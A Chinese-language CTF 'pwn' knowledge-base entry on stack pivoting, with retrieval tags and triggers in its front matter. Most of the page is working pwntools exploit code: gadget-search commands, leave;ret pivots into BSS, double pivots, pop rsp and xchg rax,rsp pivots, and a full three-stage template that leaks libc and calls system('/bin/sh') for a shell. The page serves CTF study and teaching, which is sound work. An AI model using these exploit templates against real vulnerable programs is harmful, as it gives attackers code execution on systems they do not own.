---
category: pwn
tags: [stack_pivot, leave_ret, xchg_rsp, pop_rsp, bss, 栈迁移, 栈转移, 溢出空间不足, ebp_chaining, 小溢出]
triggers: [stack pivot, small overflow, limited overflow, leave ret, xchg rsp, pop rsp, migrate stack, 栈迁移, 溢出空间不够, 溢出太短, bss rop, 小缓冲区]
related: [rop_chain, ret2libc, ret2csu, shellcode]
---

# Stack Pivot 栈迁移

## 什么时候用

栈溢出空间太小，不够放完整的 ROP 链（例如只能覆盖 RBP + RIP，约 16 字节），但可以在别处（BSS、堆、已泄露的栈地址）预先布置较长的 ROP 链。通过栈迁移把 RSP 指向那片区域，从而执行完整的 ROP。

## 前提条件

- **有栈溢出**：至少能覆盖 RBP 和 RIP（16 字节即可）
- **有可写的已知地址**：BSS 段（PIE 关或已泄露）、堆、或泄露的栈地址
- **有合适的 pivot gadget**：`leave; ret`、`pop rsp; ret`、`xchg rax, rsp; ret` 等
- **能向目标地址写入 ROP 链**：通过 `read`/`fgets` 等输入函数，或者已有数据
- ⚠️ 编译器优化可能省略帧指针（`-fomit-frame-pointer`），此时没有 `leave` 指令
- ⚠️ CET Shadow Stack 会检查 `ret` 的返回地址，pivot 后 `ret` 会 crash

## 攻击步骤

### 1. 查找 pivot gadget

```bash
# 搜索 leave; ret
ropper -f ./vuln --search "leave; ret"
ROPgadget --binary ./vuln --only "leave|ret"

# 搜索 pop rsp
ropper -f ./vuln --search "pop rsp"

# 搜索 xchg
ropper -f ./vuln --search "xchg rax, rsp"
ropper -f ./vuln --search "xchg eax, esp"
```

### 2. 方法一：leave; ret 迁移（最常用）

`leave` 等价于 `mov rsp, rbp; pop rbp`。覆盖 saved RBP 为目标地址，覆盖 RIP 为 `leave; ret` gadget：

```python
from pwn import *

context.binary = elf = ELF('./vuln')

LEAVE_RET = 0x40117c  # leave; ret gadget
BSS_STAGE = elf.bss(0x500)  # 可写区域，远离 GOT/BSS 其他数据
POP_RDI = 0x401223
RET = 0x40101a
OFFSET = 128  # buffer 到 saved RBP 的距离

p = process()

# === Stage 1: 先用 read 把 ROP 链写到 BSS ===
payload1 = b'A' * OFFSET
payload1 += p64(BSS_STAGE)     # 覆盖 RBP → BSS（leave 后 RSP 指向这里）
payload1 += p64(LEAVE_RET)     # RIP → leave; ret

p.send(payload1)

# === Stage 2: 发送完整 ROP 链到 BSS ===
# BSS 布局：[fake_rbp] [ROP chain...]
# leave: RSP=BSS_STAGE → pop rbp 消耗 fake_rbp → ret 执行 ROP
rop_chain = flat(
    0xdeadbeef,              # fake RBP（被 pop rbp 消耗）
    POP_RDI,
    elf.got['puts'],
    elf.plt['puts'],
    elf.sym['main'],
)

p.send(rop_chain)
p.interactive()
```

### 3. 方法二：二次 pivot（double pivot）

溢出太短连 `read` 调用都放不下时，先 pivot 到 BSS 执行一小段 bootstrap（调 `fgets`/`read` 读入完整 ROP），再继续：

```python
from pwn import *

context.binary = elf = ELF('./vuln')

BSS_STAGE1 = elf.bss(0x500)
BSS_STAGE2 = elf.bss(0xB00)
LEAVE_RET = 0x4013d9
POP_RDI = 0x4013a5
POP_RSI_R15 = 0x4013a3

# 第一次溢出：pivot 到 BSS_STAGE1（只需覆盖 RBP + RIP）
payload1 = b'A' * 128
payload1 += p64(BSS_STAGE1)  # RBP → BSS_STAGE1
payload1 += p64(LEAVE_RET)

p.send(payload1)

# BSS_STAGE1 预先布置 bootstrap ROP（通过此前的输入写入）
# bootstrap: read(0, BSS_STAGE2, 0x700) + leave;ret → BSS_STAGE2
bootstrap = flat(
    BSS_STAGE2,          # fake RBP → 第二阶段
    POP_RDI, 0,
    POP_RSI_R15, BSS_STAGE2, 0,
    elf.plt['read'],
    LEAVE_RET,           # 第二次 pivot 到 BSS_STAGE2
)
p.send(bootstrap)

# 发送完整 ROP 链到 BSS_STAGE2
full_rop = flat(0, POP_RDI, next(libc.search(b'/bin/sh')), libc.sym['system'])
p.send(full_rop)
p.interactive()
```

### 4. 方法三：pop rsp 迁移

`pop rsp; ret` 直接设置 RSP（常出现在 `__libc_csu_init` 中作为 `pop rsp; pop r13; pop r14; pop r15; ret`）：

```python
POP_RSP_R13_R14_R15 = 0x401225

# 需要知道 buffer 地址（栈泄露）
buffer_addr = leaked_stack_addr

# 在 buffer 开头放 ROP chain，padding 到溢出点后放 pop rsp
payload = flat(
    0, 0, 0,             # r13, r14, r15（被 pop 消耗）
    POP_RDI, 0xdeadbeef,
    elf.sym['win'],
)
payload = payload.ljust(OFFSET, b'A')
payload += flat(POP_RSP_R13_R14_R15, buffer_addr)

p.send(payload)
```

### 5. 方法四：xchg rax, rsp 迁移

有 `pop rax; ret` + `xchg rax, rsp; ret` 时：

```python
POP_RAX = 0x401234
XCHG_RAX_RSP = 0x401238

pivot_addr = leaked_heap_addr  # 已在堆上布置了 ROP 链

payload = b'A' * OFFSET
payload += p64(POP_RAX)
payload += p64(pivot_addr)
payload += p64(XCHG_RAX_RSP)  # RSP = pivot_addr
```

⚠️ `xchg eax, esp`（32 位操作）会将 RSP 高 32 位清零。目标地址必须在低 4GB 地址空间内（堆/mmap 通常满足，栈地址 0x7fff... 不行）。

### 完整 exploit 模板

```python
from pwn import *

context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')

LEAVE_RET = 0x40117c
POP_RDI = 0x401223
RET = 0x40101a
BSS = elf.bss(0x800)
OFFSET = 64

p = process()

# Stage 1: pivot 到 BSS
payload1 = b'A' * OFFSET
payload1 += p64(BSS)
payload1 += p64(LEAVE_RET)
p.sendafter(b'> ', payload1)

# Stage 2: BSS 上布置 leak ROP
stage2 = flat(
    BSS + 0x200,                   # fake RBP（指向 Stage 3）
    POP_RDI, elf.got['puts'],
    elf.plt['puts'],
    LEAVE_RET,                     # pivot 到 Stage 3
)
p.send(stage2)

leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leaked - libc.sym['puts']
log.success(f"libc: {hex(libc.address)}")

# Stage 3: getshell
stage3 = flat(0, RET, POP_RDI, next(libc.search(b'/bin/sh')), libc.sym['system'])
p.send(stage3)
p.interactive()
```

## 常见坑

- **BSS 地址冲突**：不要用 BSS 的开头（GOT、全局变量区域）。用 `elf.bss(0x500)` 或更高偏移。
- **leave 会 pop rbp**：pivot 后 `leave` 的 `pop rbp` 消耗目标区域的前 8 字节。第一个 qword 是 fake RBP，不是 ROP chain 的起点。
- **rdx 控制**：pivot 后调 `read(0, buf, count)` 需要 rdx 足够大。`puts` 会破坏 rdx。用 [[ret2csu]] 或从 libc 找 `pop rdx; pop rbx; ret`。也可依赖 rdx 残留值（GDB 中确认）。
- **栈对齐**：pivot 后 RSP 可能不再 16 字节对齐，调 `system` 前加 `ret` 垫片。
- **帧指针省略**：`-fomit-frame-pointer` 编译时函数不用 `leave` 而是 `add rsp, N; ret`，需要找其他 pivot gadget。

## 变体

### EBP Chaining

链式伪造 EBP 实现多次 pivot：每段 ROP 结尾是 `leave; ret`，RSP 被更新到新的 fake EBP 指向的地址。

### Off-by-One EBP

只能覆盖 saved RBP 最低字节时，让 `leave; ret` 将 RSP 偏移到附近的 ROP sled。配合栈上 `ret` sled 提高命中率。

### 堆上 pivot

堆地址已知时，把 ROP 链写在堆上，`xchg eax, esp` pivot 过去。堆通常在低地址，适合 32 位截断的 `xchg`。

## 相关技术

- [[rop_chain]] — pivot 后执行的 ROP 链构造
- [[ret2libc]] — pivot 后的标准攻击流程
- [[ret2csu]] — pivot 后控制 rdx 寄存器
- [[shellcode]] — pivot 到 mprotect + shellcode
